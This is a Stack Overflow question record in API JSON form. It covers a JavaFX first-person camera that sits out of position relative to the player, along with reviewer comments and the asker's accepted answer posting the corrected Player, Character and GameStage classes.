{"items":[{"tags":["java","javafx","perspectivecamera"],"comments":[{"owner":{"account_id":319873,"reputation":87612,"user_id":637853,"accept_rate":50,"display_name":"Thomas"},"score":0,"creation_date":1642415349,"post_id":70739626,"comment_id":125056128,"body_markdown":"Did you bind y to z and z to y for the red box&#39; translation on purpose?","body":"Did you bind y to z and z to y for the red box&#39; translation on purpose?"},{"owner":{"account_id":22839894,"reputation":103,"user_id":16987091,"display_name":"Darth Bane"},"score":0,"creation_date":1642415640,"post_id":70739626,"comment_id":125056247,"body_markdown":"Yes. This is because I use the Z-axis as height and JavaFX uses the Z-axis as depth. To undo this, I twisted y and z.","body":"Yes. This is because I use the Z-axis as height and JavaFX uses the Z-axis as depth. To undo this, I twisted y and z."},{"owner":{"account_id":319873,"reputation":87612,"user_id":637853,"accept_rate":50,"display_name":"Thomas"},"score":1,"creation_date":1642415933,"post_id":70739626,"comment_id":125056362,"body_markdown":"Ok, understood. Just note that this basically changes the coordinate system from right-hand (z pointing towards the camera) to left-hand (z-pointing away from the camera). To avoid confusion you should do that transformation only in once place if at all. Besides that, note the following portion of the JavaDoc on `PerspeciveCamera` which might be related to your problem: &quot;We recommend setting fixedEyeAtCameraZero to true if you are going to transform (move) the camera. Transforming the camera when fixedEyeAtCameraZero is set to false may lead to results that are not intuitive&quot;","body":"Ok, understood. Just note that this basically changes the coordinate system from right-hand (z pointing towards the camera) to left-hand (z-pointing away from the camera). To avoid confusion you should do that transformation only in once place if at all. Besides that, note the following portion of the JavaDoc on <code>PerspeciveCamera</code> which might be related to your problem: &quot;We recommend setting fixedEyeAtCameraZero to true if you are going to transform (move) the camera. Transforming the camera when fixedEyeAtCameraZero is set to false may lead to results that are not intuitive&quot;"},{"owner":{"account_id":319873,"reputation":87612,"user_id":637853,"accept_rate":50,"display_name":"Thomas"},"score":0,"creation_date":1642416630,"post_id":70739626,"comment_id":125056621,"body_markdown":"Another thing that strikes me odd: `camera.translateXProperty().bind(posX.subtract(centerX));` - shouldn&#39;t the camera&#39;s position be the same as the player&#39;s position and not be offset by the stage center?","body":"Another thing that strikes me odd: <code>camera.translateXProperty().bind(posX.subtract(centerX));</code> - shouldn&#39;t the camera&#39;s position be the same as the player&#39;s position and not be offset by the stage center?"},{"owner":{"account_id":22839894,"reputation":103,"user_id":16987091,"display_name":"Darth Bane"},"score":0,"creation_date":1642494754,"post_id":70739626,"comment_id":125078771,"body_markdown":"fixedEyeAtCameraZero zu setzen hat erstaunlich viel bewirkt. Vielen Dank!","body":"fixedEyeAtCameraZero zu setzen hat erstaunlich viel bewirkt. Vielen Dank!"},{"owner":{"account_id":319873,"reputation":87612,"user_id":637853,"accept_rate":50,"display_name":"Thomas"},"score":0,"creation_date":1642496679,"post_id":70739626,"comment_id":125079548,"body_markdown":"Great to read that :) - However, please remember that SO is an English speaking site and thus for the sake of other readers comments etc. should be kept in that language.","body":"Great to read that :) - However, please remember that SO is an English speaking site and thus for the sake of other readers comments etc. should be kept in that language."}],"answers":[{"tags":[],"owner":{"account_id":22839894,"reputation":103,"user_id":16987091,"display_name":"Darth Bane"},"down_vote_count":0,"up_vote_count":3,"is_accepted":true,"score":3,"last_activity_date":1642497621,"creation_date":1642497621,"answer_id":70753088,"question_id":70739626,"body_markdown":"Thanks to Thomas, I was able to solve the problem. The code now loks like this:\r\n\r\n[![enter image description here][1]][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/FdDOw.png\r\n\r\n```\r\npackage graphics;\r\n\r\nimport game.Player;\r\nimport javafx.application.Application;\r\nimport javafx.scene.AmbientLight;\r\nimport javafx.scene.Cursor;\r\nimport javafx.scene.Group;\r\nimport javafx.scene.Scene;\r\nimport javafx.scene.SceneAntialiasing;\r\nimport javafx.scene.SubScene;\r\nimport javafx.scene.input.KeyCode;\r\nimport javafx.scene.input.KeyEvent;\r\nimport javafx.scene.input.MouseEvent;\r\nimport javafx.scene.layout.BorderPane;\r\nimport javafx.scene.layout.Pane;\r\nimport javafx.scene.paint.Color;\r\nimport javafx.scene.paint.PhongMaterial;\r\nimport javafx.scene.shape.Box;\r\nimport javafx.scene.shape.Rectangle;\r\nimport javafx.stage.Stage;\r\n\r\npublic class GameStage extends Application implements Runnable {\r\n\r\n\t@Override\r\n\tpublic void run() {\r\n\t\tlaunch();\r\n\t}\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\t@Override\r\n\tpublic void start(Stage stage) throws Exception {\r\n\r\n\t\t// Parents\r\n\t\tBorderPane pane = new BorderPane();\r\n\t\tGroup content = new Group(new AmbientLight()), map = new Group();\r\n\t\tPane stackpane = new Pane(map);\r\n\r\n\t\t// Scenes\r\n\t\tScene scene = new Scene(pane, 500, 500);\r\n\t\tSubScene contentSubscene = new SubScene(content, 500, 500, true, SceneAntialiasing.BALANCED);\r\n\t\tcontentSubscene.widthProperty().bind(scene.widthProperty());\r\n\t\tcontentSubscene.heightProperty().bind(scene.heightProperty());\r\n\t\tSubScene minimapSubscene = new SubScene(stackpane, 256, 256);\r\n\t\tminimapSubscene.setFill(Color.DARKGREY);\r\n\r\n\t\tpane.getChildren().add(contentSubscene);\r\n\t\tpane.setBottom(minimapSubscene);\r\n\r\n\t\t// Create Player\r\n\t\tPlayer player = new Player(stage);\r\n\t\tRectangle currentPosition = new Rectangle(5, 5);\r\n\t\tcurrentPosition.layoutXProperty().bind(minimapSubscene.widthProperty().divide(2));\r\n\t\tcurrentPosition.layoutYProperty().bind(minimapSubscene.heightProperty().divide(2));\r\n\t\tcurrentPosition.setFill(Color.RED);\r\n\t\tstackpane.getChildren().add(currentPosition);\r\n\r\n\t\tmap.layoutXProperty().bind(player.posXPorperty().divide(-10).add(minimapSubscene.widthProperty().divide(2)));\r\n\t\tmap.layoutYProperty().bind(player.posYPorperty().divide(-10).add(minimapSubscene.heightProperty().divide(2)));\r\n\r\n\t\t// Create Box in\r\n\t\tPhongMaterial material = new PhongMaterial(Color.AQUA);\r\n\t\tfor (int v = 0; v &lt; 3_600; v += 180) {\r\n\t\t\tfor (int y = 0; y &lt; 500; y += 100) {\r\n\t\t\t\tBox box = new Box(50, 50, 50);\r\n\t\t\t\tbox.setTranslateX(Math.sin(v / 10) * 1_000);\r\n\t\t\t\tbox.setTranslateY(y);\r\n\t\t\t\tbox.setTranslateZ(Math.cos(v / 10) * 1_000);\r\n\t\t\t\tbox.setMaterial(material);\r\n\t\t\t\tcontent.getChildren().add(box);\r\n\r\n\t\t\t\tRectangle boxPosition = new Rectangle(5, 5);\r\n\t\t\t\tboxPosition.translateXProperty().bind(box.translateXProperty().divide(10));\r\n\t\t\t\tboxPosition.translateYProperty().bind(box.translateZProperty().divide(10));\r\n\t\t\t\tboxPosition.setFill(Color.AQUA);\r\n\t\t\t\tmap.getChildren().add(boxPosition);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tcontentSubscene.setCamera(player.getPespectiveCamera());\r\n\t\tscene.addEventHandler(KeyEvent.KEY_PRESSED, player.getKeyHandle());\r\n\t\tscene.addEventHandler(MouseEvent.MOUSE_MOVED, player.getMouseHandle());\r\n\t\tscene.setCursor(Cursor.CROSSHAIR);\r\n\t\tscene.setFill(Color.WHITE);\r\n\r\n\t\tstage.addEventHandler(KeyEvent.KEY_RELEASED, e -&gt; {\r\n\t\t\tif (e.getCode() != KeyCode.F11) {\r\n\t\t\t\treturn;\r\n\t\t\t}\r\n\t\t\tif (stage.isFullScreen()) {\r\n\t\t\t\tstage.setFullScreen(false);\r\n\t\t\t} else {\r\n\t\t\t\tstage.setFullScreen(true);\r\n\t\t\t}\r\n\t\t});\r\n\t\tstage.setAlwaysOnTop(true);\r\n\t\tstage.setScene(scene);\r\n\t\tstage.show();\r\n\r\n\t}\r\n}\r\n```\r\n\r\n```\r\npackage game;\r\n\r\nimport javafx.beans.property.DoubleProperty;\r\nimport javafx.beans.property.SimpleDoubleProperty;\r\n\r\npublic abstract class Character {\r\n\r\n\tprotected DoubleProperty posX = new SimpleDoubleProperty();\r\n\tprotected DoubleProperty posY = new SimpleDoubleProperty();\r\n\tprotected DoubleProperty posZ = new SimpleDoubleProperty();\r\n\r\n\tprotected DoubleProperty viewX = new SimpleDoubleProperty();\r\n\tprotected DoubleProperty viewY = new SimpleDoubleProperty();\r\n\r\n\tprotected DoubleProperty speed = new SimpleDoubleProperty(10);\r\n\r\n\tpublic void move(double x, double y, double z) {\r\n\r\n\t\tdouble fX = Math.cos(Math.toRadians(viewX.get()));\r\n\t\tdouble fY = -Math.sin(Math.toRadians(viewX.get()));\r\n\t\tdouble fZ = 1;\r\n\r\n\t\tposX.set(posX.get() + fX * x * speed.get());\r\n\t\tposY.set(posY.get() + fY * y * speed.get());\r\n\t\tposZ.set(posZ.get() + fZ * z);\r\n\t}\r\n\r\n\tpublic void view(double x, double y) {\r\n\t\tviewX.set(viewX.get() + x);\r\n\t\tviewY.set(viewY.get() + y);\r\n\t}\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\tpublic DoubleProperty posXPorperty() {\r\n\t\treturn posX;\r\n\t}\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\tpublic DoubleProperty posYPorperty() {\r\n\t\treturn posY;\r\n\t}\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\tpublic DoubleProperty posZPorperty() {\r\n\t\treturn posZ;\r\n\t}\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\tpublic DoubleProperty viewXPorperty() {\r\n\t\treturn viewX;\r\n\t}\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\tpublic DoubleProperty viewYPorperty() {\r\n\t\treturn viewY;\r\n\t}\r\n}\r\n```\r\n\r\n```\r\npackage game;\r\n\r\nimport javafx.application.Platform;\r\nimport javafx.beans.property.DoubleProperty;\r\nimport javafx.beans.property.SimpleDoubleProperty;\r\nimport javafx.event.EventHandler;\r\nimport javafx.scene.PerspectiveCamera;\r\nimport javafx.scene.input.KeyEvent;\r\nimport javafx.scene.input.MouseEvent;\r\nimport javafx.scene.robot.Robot;\r\nimport javafx.scene.transform.Rotate;\r\nimport javafx.stage.Stage;\r\n\r\npublic class Player extends Character {\r\n\r\n\tprivate static final Robot ROBOT = new Robot();\r\n\tprivate DoubleProperty relativeCenterX = new SimpleDoubleProperty();\r\n\tprivate DoubleProperty relativeCenterY = new SimpleDoubleProperty();\r\n\r\n\tprotected PerspectiveCamera camera = new PerspectiveCamera(true);\r\n\tprotected Rotate xAxis = new Rotate(0, 250, 0, 0, Rotate.Y_AXIS);\r\n\tprotected Rotate yAxis = new Rotate(0, 0, 250, 0, Rotate.X_AXIS);\r\n\r\n\tprotected DoubleProperty centerX = new SimpleDoubleProperty();\r\n\tprotected DoubleProperty centerY = new SimpleDoubleProperty();\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\tpublic Player(Stage stage) {\r\n\t\tcamera.getTransforms().addAll(xAxis, yAxis);\r\n\t\tcamera.setFieldOfView((40 + 62) / 2);\r\n\t\tcamera.setNearClip(0.1);\r\n\t\tcamera.setFarClip(100000);\r\n\t\tcamera.setVerticalFieldOfView(true);\r\n\r\n\t\tcenterX.bind(stage.widthProperty().divide(2));\r\n\t\tcenterY.bind(stage.heightProperty().divide(2));\r\n\r\n\t\trelativeCenterX.bind(stage.xProperty().add(centerX));\r\n\t\trelativeCenterY.bind(stage.yProperty().add(centerY));\r\n\r\n\t\txAxis.angleProperty().bind(viewX.subtract(90));\r\n\t\tyAxis.angleProperty().bind(viewY);\r\n\r\n\t\tcamera.translateXProperty().bind(posX);\r\n\t\tcamera.translateZProperty().bind(posY);\r\n\t\tcamera.translateYProperty().bind(posZ);\r\n\t}\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\tpublic EventHandler&lt;KeyEvent&gt; getKeyHandle() {\r\n\t\treturn e -&gt; {\r\n\t\t\tswitch (e.getCode()) {\r\n\t\t\tcase A:\r\n\t\t\t\tview(-1, 0);\r\n\t\t\t\tbreak;\r\n\t\t\tcase D:\r\n\t\t\t\tview(1, 0);\r\n\t\t\t\tbreak;\r\n\t\t\tcase W:\r\n\t\t\t\tmove(1, 1, 0);\r\n\t\t\t\tbreak;\r\n\t\t\tcase S:\r\n\t\t\t\tmove(-1, -1, 0);\r\n\t\t\t\tbreak;\r\n\t\t\tcase SPACE:\r\n\t\t\t\tmove(0, 0, 10);\r\n\t\t\t\tbreak;\r\n\t\t\tcase F:\r\n\t\t\t\tmove(0, 0, -10);\r\n\t\t\t\tbreak;\r\n\t\t\tdefault:\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t};\r\n\t}\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\tpublic EventHandler&lt;MouseEvent&gt; getMouseHandle() {\r\n\t\treturn e -&gt; {\r\n\t\t\tview(e.getSceneX() - centerX.doubleValue(), centerY.doubleValue() - e.getSceneY());\r\n\t\t\tPlatform.runLater(() -&gt; {\r\n\t\t\t\tROBOT.mouseMove(relativeCenterX.intValue(), relativeCenterY.intValue());\r\n\t\t\t});\r\n\t\t};\r\n\t}\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\tpublic PerspectiveCamera getPespectiveCamera() {\r\n\t\treturn camera;\r\n\t}\r\n}\r\n```","title":"First Person Camera is not on the correct position","body":"<p>Thanks to Thomas, I was able to solve the problem. The code now loks like this:</p>\n<p><a href=\"https://i.stack.imgur.com/FdDOw.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/FdDOw.png\" alt=\"enter image description here\" /></a></p>\n<pre><code>package graphics;\n\nimport game.Player;\nimport javafx.application.Application;\nimport javafx.scene.AmbientLight;\nimport javafx.scene.Cursor;\nimport javafx.scene.Group;\nimport javafx.scene.Scene;\nimport javafx.scene.SceneAntialiasing;\nimport javafx.scene.SubScene;\nimport javafx.scene.input.KeyCode;\nimport javafx.scene.input.KeyEvent;\nimport javafx.scene.input.MouseEvent;\nimport javafx.scene.layout.BorderPane;\nimport javafx.scene.layout.Pane;\nimport javafx.scene.paint.Color;\nimport javafx.scene.paint.PhongMaterial;\nimport javafx.scene.shape.Box;\nimport javafx.scene.shape.Rectangle;\nimport javafx.stage.Stage;\n\npublic class GameStage extends Application implements Runnable {\n\n    @Override\n    public void run() {\n        launch();\n    }\n\n    @SuppressWarnings(&quot;exports&quot;)\n    @Override\n    public void start(Stage stage) throws Exception {\n\n        // Parents\n        BorderPane pane = new BorderPane();\n        Group content = new Group(new AmbientLight()), map = new Group();\n        Pane stackpane = new Pane(map);\n\n        // Scenes\n        Scene scene = new Scene(pane, 500, 500);\n        SubScene contentSubscene = new SubScene(content, 500, 500, true, SceneAntialiasing.BALANCED);\n        contentSubscene.widthProperty().bind(scene.widthProperty());\n        contentSubscene.heightProperty().bind(scene.heightProperty());\n        SubScene minimapSubscene = new SubScene(stackpane, 256, 256);\n        minimapSubscene.setFill(Color.DARKGREY);\n\n        pane.getChildren().add(contentSubscene);\n        pane.setBottom(minimapSubscene);\n\n        // Create Player\n        Player player = new Player(stage);\n        Rectangle currentPosition = new Rectangle(5, 5);\n        currentPosition.layoutXProperty().bind(minimapSubscene.widthProperty().divide(2));\n        currentPosition.layoutYProperty().bind(minimapSubscene.heightProperty().divide(2));\n        currentPosition.setFill(Color.RED);\n        stackpane.getChildren().add(currentPosition);\n\n        map.layoutXProperty().bind(player.posXPorperty().divide(-10).add(minimapSubscene.widthProperty().divide(2)));\n        map.layoutYProperty().bind(player.posYPorperty().divide(-10).add(minimapSubscene.heightProperty().divide(2)));\n\n        // Create Box in\n        PhongMaterial material = new PhongMaterial(Color.AQUA);\n        for (int v = 0; v &lt; 3_600; v += 180) {\n            for (int y = 0; y &lt; 500; y += 100) {\n                Box box = new Box(50, 50, 50);\n                box.setTranslateX(Math.sin(v / 10) * 1_000);\n                box.setTranslateY(y);\n                box.setTranslateZ(Math.cos(v / 10) * 1_000);\n                box.setMaterial(material);\n                content.getChildren().add(box);\n\n                Rectangle boxPosition = new Rectangle(5, 5);\n                boxPosition.translateXProperty().bind(box.translateXProperty().divide(10));\n                boxPosition.translateYProperty().bind(box.translateZProperty().divide(10));\n                boxPosition.setFill(Color.AQUA);\n                map.getChildren().add(boxPosition);\n            }\n        }\n\n        contentSubscene.setCamera(player.getPespectiveCamera());\n        scene.addEventHandler(KeyEvent.KEY_PRESSED, player.getKeyHandle());\n        scene.addEventHandler(MouseEvent.MOUSE_MOVED, player.getMouseHandle());\n        scene.setCursor(Cursor.CROSSHAIR);\n        scene.setFill(Color.WHITE);\n\n        stage.addEventHandler(KeyEvent.KEY_RELEASED, e -&gt; {\n            if (e.getCode() != KeyCode.F11) {\n                return;\n            }\n            if (stage.isFullScreen()) {\n                stage.setFullScreen(false);\n            } else {\n                stage.setFullScreen(true);\n            }\n        });\n        stage.setAlwaysOnTop(true);\n        stage.setScene(scene);\n        stage.show();\n\n    }\n}\n</code></pre>\n<pre><code>package game;\n\nimport javafx.beans.property.DoubleProperty;\nimport javafx.beans.property.SimpleDoubleProperty;\n\npublic abstract class Character {\n\n    protected DoubleProperty posX = new SimpleDoubleProperty();\n    protected DoubleProperty posY = new SimpleDoubleProperty();\n    protected DoubleProperty posZ = new SimpleDoubleProperty();\n\n    protected DoubleProperty viewX = new SimpleDoubleProperty();\n    protected DoubleProperty viewY = new SimpleDoubleProperty();\n\n    protected DoubleProperty speed = new SimpleDoubleProperty(10);\n\n    public void move(double x, double y, double z) {\n\n        double fX = Math.cos(Math.toRadians(viewX.get()));\n        double fY = -Math.sin(Math.toRadians(viewX.get()));\n        double fZ = 1;\n\n        posX.set(posX.get() + fX * x * speed.get());\n        posY.set(posY.get() + fY * y * speed.get());\n        posZ.set(posZ.get() + fZ * z);\n    }\n\n    public void view(double x, double y) {\n        viewX.set(viewX.get() + x);\n        viewY.set(viewY.get() + y);\n    }\n\n    @SuppressWarnings(&quot;exports&quot;)\n    public DoubleProperty posXPorperty() {\n        return posX;\n    }\n\n    @SuppressWarnings(&quot;exports&quot;)\n    public DoubleProperty posYPorperty() {\n        return posY;\n    }\n\n    @SuppressWarnings(&quot;exports&quot;)\n    public DoubleProperty posZPorperty() {\n        return posZ;\n    }\n\n    @SuppressWarnings(&quot;exports&quot;)\n    public DoubleProperty viewXPorperty() {\n        return viewX;\n    }\n\n    @SuppressWarnings(&quot;exports&quot;)\n    public DoubleProperty viewYPorperty() {\n        return viewY;\n    }\n}\n</code></pre>\n<pre><code>package game;\n\nimport javafx.application.Platform;\nimport javafx.beans.property.DoubleProperty;\nimport javafx.beans.property.SimpleDoubleProperty;\nimport javafx.event.EventHandler;\nimport javafx.scene.PerspectiveCamera;\nimport javafx.scene.input.KeyEvent;\nimport javafx.scene.input.MouseEvent;\nimport javafx.scene.robot.Robot;\nimport javafx.scene.transform.Rotate;\nimport javafx.stage.Stage;\n\npublic class Player extends Character {\n\n    private static final Robot ROBOT = new Robot();\n    private DoubleProperty relativeCenterX = new SimpleDoubleProperty();\n    private DoubleProperty relativeCenterY = new SimpleDoubleProperty();\n\n    protected PerspectiveCamera camera = new PerspectiveCamera(true);\n    protected Rotate xAxis = new Rotate(0, 250, 0, 0, Rotate.Y_AXIS);\n    protected Rotate yAxis = new Rotate(0, 0, 250, 0, Rotate.X_AXIS);\n\n    protected DoubleProperty centerX = new SimpleDoubleProperty();\n    protected DoubleProperty centerY = new SimpleDoubleProperty();\n\n    @SuppressWarnings(&quot;exports&quot;)\n    public Player(Stage stage) {\n        camera.getTransforms().addAll(xAxis, yAxis);\n        camera.setFieldOfView((40 + 62) / 2);\n        camera.setNearClip(0.1);\n        camera.setFarClip(100000);\n        camera.setVerticalFieldOfView(true);\n\n        centerX.bind(stage.widthProperty().divide(2));\n        centerY.bind(stage.heightProperty().divide(2));\n\n        relativeCenterX.bind(stage.xProperty().add(centerX));\n        relativeCenterY.bind(stage.yProperty().add(centerY));\n\n        xAxis.angleProperty().bind(viewX.subtract(90));\n        yAxis.angleProperty().bind(viewY);\n\n        camera.translateXProperty().bind(posX);\n        camera.translateZProperty().bind(posY);\n        camera.translateYProperty().bind(posZ);\n    }\n\n    @SuppressWarnings(&quot;exports&quot;)\n    public EventHandler&lt;KeyEvent&gt; getKeyHandle() {\n        return e -&gt; {\n            switch (e.getCode()) {\n            case A:\n                view(-1, 0);\n                break;\n            case D:\n                view(1, 0);\n                break;\n            case W:\n                move(1, 1, 0);\n                break;\n            case S:\n                move(-1, -1, 0);\n                break;\n            case SPACE:\n                move(0, 0, 10);\n                break;\n            case F:\n                move(0, 0, -10);\n                break;\n            default:\n                break;\n            }\n        };\n    }\n\n    @SuppressWarnings(&quot;exports&quot;)\n    public EventHandler&lt;MouseEvent&gt; getMouseHandle() {\n        return e -&gt; {\n            view(e.getSceneX() - centerX.doubleValue(), centerY.doubleValue() - e.getSceneY());\n            Platform.runLater(() -&gt; {\n                ROBOT.mouseMove(relativeCenterX.intValue(), relativeCenterY.intValue());\n            });\n        };\n    }\n\n    @SuppressWarnings(&quot;exports&quot;)\n    public PerspectiveCamera getPespectiveCamera() {\n        return camera;\n    }\n}\n</code></pre>\n"}],"owner":{"account_id":22839894,"reputation":103,"user_id":16987091,"display_name":"Darth Bane"},"comment_count":6,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":113,"favorite_count":0,"down_vote_count":0,"up_vote_count":3,"accepted_answer_id":70753088,"answer_count":1,"score":3,"last_activity_date":1642497621,"creation_date":1642414284,"question_id":70739626,"body_markdown":"I am trying to create a first person camera in JavaFX based on bindings. The camera and the actual position both work perfectly. The only problem is that they don’t match! As you can see in the picture, the actual position (red box) is in the middle of the circle, but the camera is outside. How can I change that? What did I do wrong?\r\n[![enter image description here][1]][1]\r\n\r\nThe Player class handles the PerspectiveCamera.\r\n```\r\npackage game;\r\n\r\nimport javafx.application.Platform;\r\nimport javafx.beans.property.DoubleProperty;\r\nimport javafx.beans.property.SimpleDoubleProperty;\r\nimport javafx.event.EventHandler;\r\nimport javafx.scene.PerspectiveCamera;\r\nimport javafx.scene.input.KeyEvent;\r\nimport javafx.scene.input.MouseEvent;\r\nimport javafx.scene.robot.Robot;\r\nimport javafx.scene.transform.Rotate;\r\nimport javafx.scene.transform.Translate;\r\nimport javafx.stage.Stage;\r\n\r\npublic class Player extends Character {\r\n\r\n\tprivate static final Robot ROBOT = new Robot();\r\n\tprivate DoubleProperty relativeCenterX = new SimpleDoubleProperty();\r\n\tprivate DoubleProperty relativeCenterY = new SimpleDoubleProperty();\r\n\r\n\tprotected PerspectiveCamera camera = new PerspectiveCamera();\r\n\tprotected Rotate xAxis = new Rotate(0, 250, 0, 0, Rotate.Y_AXIS);\r\n\tprotected Rotate yAxis = new Rotate(0, 0, 250, 0, Rotate.X_AXIS);\r\n\tprotected Translate translate = new Translate();\r\n\r\n\tprotected DoubleProperty centerX = new SimpleDoubleProperty();\r\n\tprotected DoubleProperty centerY = new SimpleDoubleProperty();\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\tpublic Player(Stage stage) {\r\n\t\tcamera.getTransforms().addAll(xAxis, yAxis);\r\n\r\n\t\tcenterX.bind(stage.widthProperty().divide(2));\r\n\t\tcenterY.bind(stage.heightProperty().divide(2));\r\n\r\n\t\trelativeCenterX.bind(stage.xProperty().add(centerX));\r\n\t\trelativeCenterY.bind(stage.yProperty().add(centerY));\r\n\r\n\t\tcamera.translateXProperty().bind(posX.subtract(centerX));\r\n\t\tcamera.translateYProperty().bind(posZ);\r\n\t\tcamera.translateZProperty().bind(posY.subtract(centerY));\r\n\r\n\t\txAxis.angleProperty().bind(viewX.subtract(90));\r\n\t\tyAxis.angleProperty().bind(viewY);\r\n\r\n\t\ttranslate.xProperty().bind(posX);\r\n\t\ttranslate.zProperty().bind(posY);\r\n\t\ttranslate.yProperty().bind(posZ);\r\n\t}\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\tpublic EventHandler&lt;KeyEvent&gt; getKeyHandle() {\r\n\t\treturn e -&gt; {\r\n\t\t\tswitch (e.getCode()) {\r\n\t\t\tcase A:\r\n\t\t\t\tview(-1, 0);\r\n\t\t\t\tbreak;\r\n\t\t\tcase D:\r\n\t\t\t\tview(1, 0);\r\n\t\t\t\tbreak;\r\n\t\t\tcase W:\r\n\t\t\t\tmove(1, 1, 0);\r\n\t\t\t\tbreak;\r\n\t\t\tcase S:\r\n\t\t\t\tmove(-1, -1, 0);\r\n\t\t\t\tbreak;\r\n\t\t\tcase SPACE:\r\n\t\t\t\tmove(0, 0, 10);\r\n\t\t\t\tbreak;\r\n\t\t\tcase F:\r\n\t\t\t\tmove(0, 0, -10);\r\n\t\t\t\tbreak;\r\n\t\t\tdefault:\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t};\r\n\t}\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\tpublic EventHandler&lt;MouseEvent&gt; getMouseHandle() {\r\n\t\treturn e -&gt; {\r\n\t\t\tview(e.getSceneX() - centerX.doubleValue(), centerY.doubleValue() - e.getSceneY());\r\n\t\t\tPlatform.runLater(() -&gt; {\r\n\t\t\t\tROBOT.mouseMove(relativeCenterX.intValue(), relativeCenterY.intValue());\r\n\t\t\t});\r\n\t\t};\r\n\t}\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\tpublic PerspectiveCamera getPespectiveCamera() {\r\n\t\treturn camera;\r\n\t}\r\n}\r\n\r\n```\r\n\r\nThe Character class calculates position and view.\r\n```\r\npackage game;\r\n\r\nimport javafx.beans.property.DoubleProperty;\r\nimport javafx.beans.property.SimpleDoubleProperty;\r\n\r\npublic abstract class Character {\r\n\r\n\tprotected DoubleProperty posX = new SimpleDoubleProperty();\r\n\tprotected DoubleProperty posY = new SimpleDoubleProperty();\r\n\tprotected DoubleProperty posZ = new SimpleDoubleProperty();\r\n\r\n\tprotected DoubleProperty viewX = new SimpleDoubleProperty();\r\n\tprotected DoubleProperty viewY = new SimpleDoubleProperty();\r\n\r\n\tprotected DoubleProperty speed = new SimpleDoubleProperty(10);\r\n\r\n\tpublic void move(double x, double y, double z) {\r\n\r\n\t\tdouble fX = Math.cos(Math.toRadians(viewX.get()));\r\n\t\tdouble fY = -Math.sin(Math.toRadians(viewX.get()));\r\n\t\tdouble fZ = 1;\r\n\r\n\t\tposX.set(posX.get() + fX * x * speed.get());\r\n\t\tposY.set(posY.get() + fY * y * speed.get());\r\n\t\tposZ.set(posZ.get() + fZ * z);\r\n\t}\r\n\r\n\tpublic void view(double x, double y) {\r\n\t\tviewX.set(viewX.get() + x);\r\n\t\tviewY.set(viewY.get() + y);\r\n\t}\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\tpublic DoubleProperty posXPorperty() {\r\n\t\treturn posX;\r\n\t}\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\tpublic DoubleProperty posYPorperty() {\r\n\t\treturn posY;\r\n\t}\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\tpublic DoubleProperty posZPorperty() {\r\n\t\treturn posZ;\r\n\t}\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\tpublic DoubleProperty viewXPorperty() {\r\n\t\treturn viewX;\r\n\t}\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\tpublic DoubleProperty viewYPorperty() {\r\n\t\treturn viewY;\r\n\t}\r\n}\r\n```\r\n\r\nMy Application, which shows the total graphical content.\r\n```\r\npackage graphics;\r\n\r\nimport game.Player;\r\nimport javafx.application.Application;\r\nimport javafx.scene.Cursor;\r\nimport javafx.scene.Group;\r\nimport javafx.scene.Scene;\r\nimport javafx.scene.SceneAntialiasing;\r\nimport javafx.scene.SubScene;\r\nimport javafx.scene.input.KeyCode;\r\nimport javafx.scene.input.KeyEvent;\r\nimport javafx.scene.input.MouseEvent;\r\nimport javafx.scene.layout.BorderPane;\r\nimport javafx.scene.paint.Color;\r\nimport javafx.scene.paint.PhongMaterial;\r\nimport javafx.scene.shape.Box;\r\nimport javafx.scene.shape.Rectangle;\r\nimport javafx.stage.Stage;\r\n\r\npublic class GameStage extends Application implements Runnable {\r\n\r\n\t@Override\r\n\tpublic void run() {\r\n\t\tlaunch();\r\n\t}\r\n\r\n\t@SuppressWarnings(&quot;exports&quot;)\r\n\t@Override\r\n\tpublic void start(Stage stage) throws Exception {\r\n\r\n\t\tBorderPane pane = new BorderPane();\r\n\t\tScene scene = new Scene(pane, 500, 500);\r\n\r\n\t\tGroup content = new Group(), map = new Group();\r\n\t\tContentScene subscene = new ContentScene(content, map, 500, 500);\r\n\t\tsubscene.widthProperty().bind(scene.widthProperty());\r\n\t\tsubscene.heightProperty().bind(scene.heightProperty());\r\n\t\tpane.getChildren().add(subscene);\r\n\t\tpane.setBottom(map);\r\n\r\n\t\tPlayer player = new Player(stage);\r\n\t\tBox box = new Box(50, 50, 50);\r\n\t\tbox.translateXProperty().bind(player.posXPorperty());\r\n\t\tbox.translateYProperty().bind(player.posZPorperty());\r\n\t\tbox.translateZProperty().bind(player.posYPorperty());\r\n\t\tbox.rotateProperty().bind(player.viewXPorperty());\r\n\t\tbox.setMaterial(new PhongMaterial(Color.RED));\r\n\t\tcontent.getChildren().add(box);\r\n\r\n\t\tRectangle rectangle = new Rectangle(5, 